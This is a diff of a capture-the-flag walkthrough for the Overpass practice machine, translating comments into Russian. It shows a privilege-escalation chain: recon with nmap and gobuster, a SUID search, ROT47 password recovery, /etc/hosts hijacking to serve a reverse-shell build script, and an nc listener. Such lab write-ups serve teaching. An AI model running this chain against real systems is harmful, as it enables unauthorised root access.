@@ -19,7 +19,7 @@
 ```commandline
 sudo nmap -sS -sV {Add your machine ip here}
 gobuster --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u {Add your machine ip here}
-# {Add your machine ip here}/admin
+# {IP целевой машины}/admin
 # login.js
 
 mkdir ssh
@@ -44,11 +44,13 @@ find / -perm -u=s -type -f 2>/dev/null
 cat todo.txt
 ls -la
 cat .overpass
-# {Add your machine ip here}/downloads
-# Using an online ROT47 decipher tool to decrypt James’ password
+# {IP целевой машины}/downloads
+# Используя шифр ROT47 проебразуем кодовою фразу из файла .overpass в пароль пользователя james
+sudo -l
+crontab -l
 nano /etc/hosts
-# change IP overpass.thm {Add your machine ip here}
-# create reverseshell overpass.thm/downloads/src/buildscript.sh
+# изменим IP overpass.thm на адресс Вашей атакующей машины
+# создадим реверс шел на нашей машине overpass.thm/downloads/src/buildscript.sh
 python3 -m http.server 80
 nc -nvlp 4444
 cat root.txt
